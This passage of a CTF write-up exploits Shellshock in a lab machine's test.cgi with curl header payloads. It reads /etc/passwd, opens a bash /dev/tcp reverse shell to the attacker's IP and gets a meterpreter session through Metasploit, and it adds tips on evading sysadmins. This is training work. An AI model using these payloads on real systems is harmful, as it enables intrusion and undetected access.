&lt;h3 id=&quot;gobuster&quot;&gt;Gobuster&lt;/h3&gt;

&lt;p&gt;Let‚Äôs enum some more. I‚Äôm going to attempt to enumerate some hidden directories using a tool called &lt;a href=&quot;https://github.com/OJ/gobuster&quot;&gt;gobuster&lt;/a&gt;. Here is the command and output:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo gobuster dir -u http://10.10.118.199 HERE -w /usr/share/dirb/wordlists/big.txt -t 32 |tee gobuster.txt

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.152.132/
[+] Method:                  GET
[+] Threads:                 32
[+] Wordlist:                /usr/share/dirb/wordlists/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2020/10/30 22:54:23 Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 289]
/.htaccess            (Status: 403) [Size: 289]
/admin                (Status: 301) [Size: 313] [--&amp;gt; http://10.10.152.132/admin/]
/backup               (Status: 301) [Size: 314] [--&amp;gt; http://10.10.152.132/backup/]
/cgi-bin              (Status: 301) [Size: 315] [--&amp;gt; http://10.10.152.132/cgi-bin/]
/cgi-bin/             (Status: 403) [Size: 288]                                    
/css                  (Status: 301) [Size: 311] [--&amp;gt; http://10.10.152.132/css/]    
/img                  (Status: 301) [Size: 311] [--&amp;gt; http://10.10.152.132/img/]    
/js                   (Status: 301) [Size: 310] [--&amp;gt; http://10.10.152.132/js/]     
/robots.txt           (Status: 200) [Size: 38]                                     
/secret               (Status: 301) [Size: 314] [--&amp;gt; http://10.10.152.132/secret/] 
/server-status        (Status: 403) [Size: 293]                                    
/uploads              (Status: 301) [Size: 315] [--&amp;gt; http://10.10.152.132/uploads/]
===============================================================
2020/10/30 22:55:21 Finished
===============================================================
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So, there is &lt;em&gt;a lot&lt;/em&gt; to unpack here. While my &lt;a href=&quot;https://cirt.net/Nikto2&quot;&gt;nikto&lt;/a&gt; scan is running, let‚Äôs go through everything we found here, one by one.&lt;/p&gt;

&lt;h3 id=&quot;investigating-hidden-directories&quot;&gt;Investigating hidden directories&lt;/h3&gt;

&lt;p&gt;The first directory that didn‚Äôt return a 403 forbidden was /admin. Let‚Äôs take a look.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jambot@dishwasher:~$ curl http://10.10.118.199/admin/
jambot@dishwasher:~$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Huh, nothing. A bit weird. Note that the slash at the end of the URL indicates that this is not a singular static file, but a directory. Meaning there could be even more hidden directories in it. Let‚Äôs try another gobuster scan. Some tools like dirb will work recursively and go into every directory.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jambot@dishwasher:~/Desktop/challenges/tryhackme/0day$ gobuster dir -u http://10.10.118.199/admin -w /usr/share/dirb/wordlists/big.txt -q t 64
/.htpasswd            (Status: 403) [Size: 295]
/.htaccess            (Status: 403) [Size: 295]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Next we have cgi-bin. The cgi-bin directory usually contains compiled script files used by the server. We could try to find some of these with gobuster using this command:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jambot@dishwasher:~/Desktop/challenges/tryhackme/0day$ gobuster dir -u http://10.10.118.199/cgi-bin -x sh,bin,py,pl,cgi -w /usr/share/dirb/wordlists/big.txt -t 64 -q
/.htaccess.py         (Status: 403) [Size: 300]
/.htpasswd.bin        (Status: 403) [Size: 301]
/.htaccess.pl         (Status: 403) [Size: 300]
/.htpasswd.py         (Status: 403) [Size: 300]
/.htaccess.cgi        (Status: 403) [Size: 301]
/.htpasswd            (Status: 403) [Size: 297]
/.htaccess            (Status: 403) [Size: 297]
/.htpasswd.pl         (Status: 403) [Size: 300]
/.htaccess.sh         (Status: 403) [Size: 300]
/.htpasswd.cgi        (Status: 403) [Size: 301]
/.htaccess.bin        (Status: 403) [Size: 301]
/.htpasswd.sh         (Status: 403) [Size: 300]
/test.cgi             (Status: 200) [Size: 13]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;finding-a-vulnerability&quot;&gt;Finding a vulnerability&lt;/h1&gt;

&lt;p&gt;Yea, so everything seems in working ord- HOLD ON! Let‚Äôs see if you can spot the rogue file. If you guess &lt;code class=&quot;highlighter-rouge&quot;&gt;test.cgi&lt;/code&gt;, you‚Äôre correct! cgi-bin should not expose any of it‚Äôs scripts, especially a sketchy looking one like this. In fact, you don‚Äôt need specific knowlege of this file to know this is a vulnerability. Just googling ‚Äúcgi bin test.cgi‚Äù nets you results like these‚Ä¶&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://jambot3000.github.io/assets/images/googlesearchtestcgi.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When looking for exploits, this is always a good sign. Always be sure to google version numbers etc when looking for CVE‚Äôs. One of the first results down was this:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.surevine.com/shellshocked-a-quick-demo-of-how-easy-it-is-to-exploit/&quot;&gt;https://www.surevine.com/shellshocked-a-quick-demo-of-how-easy-it-is-to-exploit/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;If you were to follow along with this site- you would see that it talks about an &lt;a href=&quot;https://en.wikipedia.org/wiki/Arbitrary_code_execution&quot;&gt;RCE&lt;/a&gt;. It gives a simple one liner to achieve this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://jambot3000.github.io/assets/images/shellshocked_example.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It‚Äôs also worth mentioning that using a tool such as nikto would have also find this vulnerability, however only versions &lt;code class=&quot;highlighter-rouge&quot;&gt;2.1.6&lt;/code&gt; seem to be able to find it.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jambot@dishwasher:~/Desktop/challenges/tryhackme/0day$ perl ~/nikto/program/nikto.pl -h 10.10.118.199
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.118.199
+ Target Hostname:    10.10.118.199
+ Target Port:        80
+ Start Time:         2020-11-05 00:48:28 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.7 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the    site in a different fashion to the MIME type.
+ Server may leak inodes via ETags, header found with file /, inode: bd1, size: 5ae57bb9a1192, mtime: gzip
+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.46). Apache 2.2.34 is the EOL for the 2.  x branch.
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
+ Uncommon header '93e4r0-cve-2014-6271' found, with contents: true
+ OSVDB-112004: /cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre. org/cgi-bin/cvename.cgi?name=CVE-2014-6278).
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;At the bottom, we can see this references the exact same CVE as we found just from a bit of googling. Anyway let‚Äôs figure out what that one liner is doing, and try to recreate it for our purposes.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jambot@dishwasher:~/Desktop/challenges/tryhackme/0day$ curl  http://10.10.158.129/cgi-bin/test.cgi -H &quot;custom:() { ignored; }; echo ; /bin/cat /etc/passwd &quot;
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
ryan:x:1000:1000:Ubuntu 14.04.1,,,:/home/ryan:/bin/bash
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Awesome, so it works for us. But what is it actually doing and why does this work??&lt;/p&gt;

&lt;p&gt;Okay so. The bash CGI script on the apache server, test.cgi echoes some text back in the form of HTML. But for some reason, it liked to reads data in the HTTP headers. Because of this, if we play around with some environment variables we are actually able to inject arbitrary code, due to lack of sanitisation of the headers. So, now that we have arbitrary code execution, we pretty much have access to the machine- it‚Äôs as simple as getting a reverse shell.&lt;/p&gt;

&lt;p&gt;While it‚Äôs not necessary I‚Äôm going to be covering some more practical methods of gaining access to the machine- I feel like so many people have the mindset of ‚Äúepic let‚Äôs get a reverse shell and then root‚Äù without actually wanting to learn anything new. Plus, it‚Äôs not practical to spawn a typical netcat reverse shell in a situation where there may or may not be a blue team. There is no encryption and it looks extremely sketchy in the process list. Anyone monitoring the network traffic can see the plaintext of everything you do. Of course it‚Äôs fine for a CTF like this. But I think it‚Äôs awesome to know some more practical methods, so when you finally get to that epic moment of getting remote access to a system, and you feel like a cool epic &lt;code class=&quot;highlighter-rouge&quot;&gt;1337 Hax0r&lt;/code&gt; you don‚Äôt just get your plans foiled by an average sysadmin.&lt;/p&gt;

&lt;p&gt;I‚Äôm aware this is beginner room- and I‚Äôm going quite in depth here so I apologise to those wanting a simple straightforward writeup. Essentially I‚Äôm going to cover a few ways of gaining remote access to this box, and explain their advantages and disadvantages.&lt;/p&gt;

&lt;h1 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h1&gt;

&lt;h2 id=&quot;netcat&quot;&gt;Netcat&lt;/h2&gt;

&lt;p&gt;Epic, so firstly we have our basic netcat reverse shell. Anyone who has done a boot2root style CTF will have used this.&lt;/p&gt;

&lt;h3 id=&quot;how-it-works&quot;&gt;How it works&lt;/h3&gt;

&lt;p&gt;Okay so, we have established that we can execute code on the client. We‚Äôre first going to set up what‚Äôs called a ‚Äúlistener‚Äù. A listener is exactly what it sounds like. It‚Äôs just going to listen for incoming connections. That‚Äôs the first thing we are going to set up. This can be done with this command:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jambot@dishwasher:~/Desktop/challenges/tryhackme/0day$ nc -nlvp 1234
Listening on 0.0.0.0 1234
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So, after this we are going to tell the server to connect to us. If you‚Äôre new &lt;del&gt;or just have a bad memory&lt;/del&gt; then &lt;a href=&quot;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&quot;&gt;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&lt;/a&gt; is an awesome resource. We‚Äôre going to be using a bash reverse shell. (Ironically this site is &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; meaninig if you go to it, anyone on the same network can very easily sniff this out)&lt;/p&gt;

&lt;p&gt;So the code we want to execute on the server is this:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/YOUR_IP/PORT 0&amp;gt;&amp;amp;1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If you want to find out what your IP address is on the network you connect to via the vpn, simply run the &lt;code class=&quot;highlighter-rouge&quot;&gt;ifconfig&lt;/code&gt; command. The output should look something like this:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jambot@dishwasher:~/Desktop/challenges/tryhackme/0day$ ifconfig
lo: flags=73&amp;lt;UP,LOOPBACK,RUNNING&amp;gt;  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10&amp;lt;host&amp;gt;
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 61131  bytes 874871385 (874.8 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 61131  bytes 874871385 (874.8 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

tun0: flags=4305&amp;lt;UP,POINTOPOINT,RUNNING,NOARP,MULTICAST&amp;gt;  mtu 1500
        inet 10.9.55.221  netmask 255.255.0.0  destination 10.9.55.221
        inet6  prefixlen 64  scopeid 0x20&amp;lt;link&amp;gt;
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 100  (UNSPEC)
        RX packets 26  bytes 6884 (6.8 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 131  bytes 8317 (8.3 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlp1s0: flags=4163&amp;lt;UP,BROADCAST,RUNNING,MULTICAST&amp;gt;  mtu 1500
        inet 192.168.0.13  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6  prefixlen 64  scopeid 0x20&amp;lt;link&amp;gt;
        ether  txqueuelen 1000  (Ethernet)
        RX packets 3562906  bytes 2295631566 (2.2 GB)
        RX errors 0  dropped 16  overruns 0  frame 0
        TX packets 5616223  bytes 3419187374 (3.4 GB)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;tun0&lt;/code&gt; interface should be the one you should use. And the port should be whatever listening port you used. In my case it was &lt;code class=&quot;highlighter-rouge&quot;&gt;1234&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;So if I substitute the IP and port into the command, and the command into the HTTP header of the curl request we send, hopefully we should recieve a connection.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jambot@dishwasher:~/Desktop/challenges/tryhackme/0day$ curl http://10.10.158.129/cgi-bin/test.cgi -H &quot;custom:() { ignored; }; /bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.9.55.221/1234 0&amp;gt;&amp;amp;1; &quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;getting-the-shell&quot;&gt;Getting the shell&lt;/h3&gt;

&lt;p&gt;The shell we sent the request in will stay open. But if you done this right, and the technology gods took pity on you today, then if you look at your listener you should have a shell! :)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jambot@dishwasher:~/Desktop/challenges/tryhackme/0day$ nc -nlvp 1234
Listening on 0.0.0.0 1234
Connection received on 10.10.158.129 57790
bash: cannot set terminal process group (865): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/usr/lib/cgi-bin$ ls 	
ls
test.cgi
www-data@ubuntu:/usr/lib/cgi-bin$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@ubuntu:/usr/lib/cgi-bin$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Awesome, we have an interactive shell. This is cool and all but it has its downfalls too.&lt;/p&gt;

&lt;h3 id=&quot;problems&quot;&gt;Problems&lt;/h3&gt;

&lt;p&gt;I‚Äôll try not to make this too long. But I am a huge advocate for good post exploitation and ‚Äúnot getting caught‚Äù skills. Breaking into something is only the first part of penetration testing, the second part is making sure no one notices. Because of this I‚Äôll likely make a seperate, much more in depth blog post explaining good post exploitation practices for windows, and unix based systems. I will likely make a more in depth blog about post exploitation in the future&lt;/p&gt;

&lt;h4 id=&quot;problem-1&quot;&gt;Problem #1&lt;/h4&gt;

&lt;p&gt;We didn‚Äôt cover our tracks. The second our processed spawned, it immediately looked sketchy. Look at this:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@ubuntu:/usr/lib/cgi-bin$ ps aux |grep bash
ps aux |grep bash
www-data  1000  0.0  0.2   9512  1148 ?        S    20:15   0:00 /bin/bash /usr/lib/cgi-bin/test.cgi
www-data  1001  0.0  0.3  18148  1960 ?        S    20:15   0:00 /bin/bash -i
www-data  1011  0.0  0.1   8872   648 ?        S    20:20   0:00 grep bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If the sysadmin is compentant enough, he would see this and **immediately notice something is up. A cgi script spawning a shell???? And then more processes within that???? There is never a reason for a random cgi script to do this. If they had a tree view of processes, they would see this under apache- which looks even more sketchy and in many cases they won‚Äôt even look to it. They may have systems in place to detect this kind of stuff, or flag whenever a process attempts to open up a port disabled by &lt;a href=&quot;https://wiki.ubuntu.com/UncomplicatedFirewall&quot;&gt;UFW&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Ideally if we do want a shell, we want it to look like some system process, something that wouldn‚Äôt make anyone bat an eye.&lt;/p&gt;

&lt;h4 id=&quot;problem-2&quot;&gt;Problem #2&lt;/h4&gt;

&lt;p&gt;This shell is just‚Ä¶ bad. It‚Äôs not persistant, which means I have to perform this exploit any time I want to remote into the server. If someone were to kill the process then I would immediately be kicked out with no chance to go on the offensive side and try keep my foothold into the network.&lt;/p&gt;

&lt;p&gt;Aside from this there is also the problem of well, this:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@ubuntu:/usr/lib/cgi-bin$ sudo su
sudo su
sudo: no tty present and no askpass program specified
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Granted, this isn‚Äôt that big of a problem, this is relatively easy to fix. The most common solution to this is:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@ubuntu:/usr/lib/cgi-bin$ python -c &quot;import pty;pty.spawn('/bin/bash')&quot;
&amp;lt;i-bin$ python -c &quot;import pty;pty.spawn('/bin/bash')&quot;                        
www-data@ubuntu:/usr/lib/cgi-bin$ sudo su
sudo su
[sudo] password for www-data: a

Sorry, try again.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;However, this in itself causes more problems. We‚Äôre just raiding more and more red flags. This looks even more sketch than the previous thing we done:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@ubuntu:/usr/lib/cgi-bin$ ps aux |grep py
ps aux |grep py
www-data  1038  0.0  1.0  31904  5060 ?        S    20:32   0:00 python -c import pty;pty.spawn('/bin/bash')
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;There are other solutions to this problem, but it‚Äôs all dependant on your environment. In general not many of them are good (from a realistic pentesting POV).&lt;/p&gt;

&lt;p&gt;So yea, that‚Äôs it for your basic netcat reverse shell. Let‚Äôs move on to metasploit and meterpreter shells.&lt;/p&gt;

&lt;h2 id=&quot;metasploit&quot;&gt;Metasploit&lt;/h2&gt;

&lt;p&gt;Okay so first and foremost let‚Äôs get this out the way, it is okay to use &lt;a href=&quot;https://www.metasploit.com/&quot;&gt;metasploit&lt;/a&gt;. So long as you actually know what‚Äôs going on. Some people who use it will often get labelled a skid etc etc. However personally I think it‚Äôs fine to use so long as you understand the exploit and the consequences of your actions. I think if you‚Äôre starting out, it can make things easy and skip over a lot of the important stuff. Which is why I think if you‚Äôre new to cyber security you should try to avoid using this as much as possible. So many people go down the path of thinking they are the 1337est of Hax0rs because they can use metasploit- and then when it comes for them to actually do stuff, they realise knowing how to type &lt;code class=&quot;highlighter-rouge&quot;&gt;use &amp;lt;module&amp;gt;&lt;/code&gt; doesn‚Äôt actually help. With that being said however, it does have it‚Äôs place. For example meterpreter shells have a ton of awesome features that can make post exploitation sooo much easier. Ontop of that it has less practical things such as taking webcam snapshots- but it‚Äôs not uncommon for pentesters to use these features just to convey the severity of the exploit. If a company doesn‚Äôt really have anyone into security, telling them that their systems are effected by CVE-69-420 won‚Äôt mean anything to them- so often times it can help to include in the report real world consequences, i.e. access to cameras, the ability to steal credentials etc etc. Dealing with people is a big part of pentesting that not a lot of people consider.&lt;/p&gt;

&lt;p&gt;Sorry for the smol rant there hehe- on with the exploitation!&lt;/p&gt;

&lt;p&gt;Using metasploit is super simple. Once it‚Äôs installed just type &lt;code class=&quot;highlighter-rouge&quot;&gt;msfconsole&lt;/code&gt; in your terminal and it should start.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    _                                                    _
/ \    /\         __                         _   __  /_/ __
| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
    |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\


    =[ metasploit v6.0.13-dev-                         ]
+ -- --=[ 2072 exploits - 1120 auxiliary - 352 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: To save all commands executed since start up to a file, use the makerc command

msf6 &amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;finding-the-exploit&quot;&gt;Finding the exploit&lt;/h3&gt;

&lt;p&gt;Metasploit is literally made for this, To find a particular exploit just do this:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf6 &amp;gt; search shellshock

Matching Modules
================

#   Name                                               Disclosure Date  Rank       Check  Description
-   ----                                               ---------------  ----       -----  -----------
0   auxiliary/scanner/http/apache_mod_cgi_bash_env     2014-09-24       normal     Yes    Apache mod_cgi     Bash Environment Variable Injection (Shellshock) Scanner
1   auxiliary/server/dhclient_bash_env                 2014-09-24       normal     No     DHCP Client Bash   Environment Variable Code Injection (Shellshock)
2   exploit/linux/http/advantech_switch_bash_env_exec  2015-12-01       excellent  Yes    Advantech Switch   Bash Environment Variable Code Injection (Shellshock)
3   exploit/linux/http/ipfire_bashbug_exec             2014-09-29       excellent  Yes    IPFire Bash    Environment Variable Injection (Shellshock)
4   exploit/multi/ftp/pureftpd_bash_env_exec           2014-09-24       excellent  Yes    Pure-FTPd  External Authentication Bash Environment Variable Code Injection (Shellshock)
5   exploit/multi/http/apache_mod_cgi_bash_env_exec    2014-09-24       excellent  Yes    Apache mod_cgi     Bash Environment Variable Code Injection (Shellshock)
6   exploit/multi/http/cups_bash_env_exec              2014-09-24       excellent  Yes    CUPS Filter Bash   Environment Variable Code Injection (Shellshock)
7   exploit/multi/misc/legend_bot_exec                 2015-04-27       excellent  Yes    Legend Perl IRC    Bot Remote Code Execution
8   exploit/multi/misc/xdh_x_exec                      2015-12-04       excellent  Yes    Xdh / LinuxNet     Perlbot / fBot IRC Bot Remote Code Execution
9   exploit/osx/local/vmware_bash_function_root        2014-09-24       normal     Yes    OS X VMWare    Fusion Privilege Escalation via Bash Environment Code Injection (Shellshock)
10  exploit/unix/dhcp/bash_environment                 2014-09-24       excellent  No     Dhclient Bash  Environment Variable Injection (Shellshock)
11  exploit/unix/smtp/qmail_bash_env_exec              2014-09-24       normal     No     Qmail SMTP Bash    Environment Variable Injection (Shellshock)


Interact with a module by name or index. For example info 11, use 11 or use exploit/unix/smtp/  qmail_bash_env_exec

msf6 &amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;configuring-options&quot;&gt;Configuring options&lt;/h3&gt;

&lt;p&gt;As we can see, there are a few options here. so we just do:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf6 &amp;gt; use 5
[*] Using configured payload linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) &amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After this we view are options to see what we have to set. This is how my options were configured:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) &amp;gt; show options

Module options (exploit/multi/http/apache_mod_cgi_bash_env_exec):

Name            Current Setting                      Required  Description
----            ---------------                      --------  -----------
CMD_MAX_LENGTH  2048                                 yes       CMD max line length
CVE             CVE-2014-6271                        yes       CVE to check/exploit (Accepted:   CVE-2014-6271, CVE-2014-6278)
HEADER          User-Agent                           yes       HTTP header to use
METHOD          GET                                  yes       HTTP method to use
Proxies                                              no        A proxy chain of format type:host:port[,  type:host:port][...]
RHOSTS          10.10.40.27                          yes       The target host(s), range CIDR identifier,    or hosts file with syntax 'file:&amp;lt;path&amp;gt;'
RPATH           /bin                                 yes       Target PATH for binaries used by the  CmdStager
RPORT           80                                   yes       The target port (TCP)
SRVHOST         0.0.0.0                              yes       The local host or network interface to    listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
SRVPORT         8080                                 yes       The local port to listen on.
SSL             false                                no        Negotiate SSL/TLS for outgoing connections
SSLCert                                              no        Path to a custom SSL certificate (default is  randomly generated)
TARGETURI       http://10.10.40.27/cgi-bin/test.cgi  yes       Path to CGI script
TIMEOUT         5                                    yes       HTTP read response timeout (seconds)
URIPATH                                              no        The URI to use for this exploit (default is   random)
VHOST                                                no        HTTP server virtual host


Payload options (linux/x86/meterpreter/reverse_tcp):

Name   Current Setting  Required  Description
----   ---------------  --------  -----------
LHOST  tun0             yes       The listen address (an interface may be specified)
LPORT  4444             yes       The listen port


Exploit target:

Id  Name
--  ----
0   Linux x86
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;running-the-exploit&quot;&gt;Running the exploit&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) &amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And now running the exploit is as simple as this:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) &amp;gt; run

[*] Started reverse TCP handler on 10.9.55.221:4444 
[*] Command Stager progress - 100.46% done (1097/1092 bytes)
[*] Sending stage (976712 bytes) to 10.10.40.27
[*] Meterpreter session 1 opened (10.9.55.221:4444 -&amp;gt; 10.10.40.27:49141) at 2020-11-05 06:36:13 +0000

meterpreter &amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

